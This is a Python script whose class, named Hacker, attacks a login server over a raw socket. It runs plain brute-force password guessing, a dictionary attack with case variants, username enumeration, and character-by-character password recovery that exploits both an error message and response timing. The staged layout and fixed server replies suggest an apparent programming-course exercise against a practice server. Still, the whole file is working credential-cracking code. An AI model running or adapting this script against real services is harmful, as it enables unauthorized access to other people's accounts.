import sys
import socket
import itertools
import string
import json
import datetime


class Hacker:
    def __init__(self):
        self.sock = socket.socket()
        self.characters = string.ascii_lowercase + string.digits

    def connection(self, ip, port):
        self.ip = ip
        self.port = int(port)
        self.sock.connect((self.ip, self.port))

    def send_message(self, message):
        self.sock.send(message.encode())

    def response(self):
        return self.sock.recv(1024).decode()

    def close(self):
        self.sock.close()

    def stage_1(self, ip, port, message):
        self.connection(ip, port)
        self.send_message(message)
        resp = self.response()
        print(resp)
        self.close()

    def generate(self, times):
        return itertools.product(self.characters, repeat=times)

    def stage_2(self, ip, port):
        self.sock.connect((ip, int(port)))
        i = 1
        while True:
            found = False
            generator = self.generate(i)
            while True:
                try:
                    tple = next(generator)
                except StopIteration:
                    break
                word = ''
                for letter in tple:
                    word += letter
                self.send_message(word)
                if self.response() == 'Connection success!':
                    found = True
                    break
            if found:
                break
            i += 1
        self.sock.close()
        print(word)

    def combinations(self, string):
        if not string.isdigit():
            for word in map(''.join, itertools.product(*zip(string.upper(), string.lower()))):
                yield word
        yield string

    def common(self):
        path = 'passwords.txt'
        with open(path) as passwords:
            for password in passwords:
                for combination in self.combinations(password.strip('\n')):
                    yield combination

    def stage_3(self, ip, port):
        self.connection(ip, port)
        for password in self.common():
            self.send_message(password)
            if self.response() == 'Connection success!':
                print(password)
                break
        self.sock.close()

    def username(self):
        path = 'logins.txt'
        with open(path) as usernames:
            for username in usernames:
                yield username.strip('\n')

    def create_json(self, username, password):
        return json.dumps({
            "login": username,
            "password": password
        })

    def stage_4(self, ip, port):
        characters = string.ascii_letters + string.digits
        self.connection(ip, port)
        for username in self.username():
            self.send_message(self.create_json(username, ''))
            resp = json.loads(self.response())['result']
            if resp == 'Exception happened during login':
                self.login = username
                break
        self.password = ''
        found = False
        while True:
            for char in characters:
                self.send_message(self.create_json(self.login, self.password + char))
                resp = json.loads(self.response())['result']
                if resp == 'Connection success!':
                    self.password += char
                    found = True
                    break
                if resp == 'Exception happened during login':
                    self.password += char
                    break
            if found:
                break
        print(self.create_json(self.login, self.password))
        self.close()

    def stage_5(self, ip, port):
        characters = string.ascii_letters + string.digits
        self.connection(ip, port)
        for username in self.username():
            self.send_message(self.create_json(username, ''))
            resp = json.loads(self.response())['result']
            if resp != 'Wrong login!':
                self.login = username
                break
        self.password = ''
        found = False
        while True:
            for char in characters:
                self.send_message(self.create_json(self.login, self.password + char))
                start = datetime.datetime.now()
                resp = json.loads(self.response())['result']
                end = datetime.datetime.now()
                difference = end - start
                if resp == 'Connection success!':
                    self.password += char
                    found = True
                    break
                if difference.microseconds > 99999 and resp == 'Wrong password!':
                    self.password += char
                    break
            if found:
                break
        print(self.create_json(self.login, self.password))
        self.close()


ip = sys.argv[1]
port = sys.argv[2]

hacker = Hacker()
hacker.stage_5(ip, port)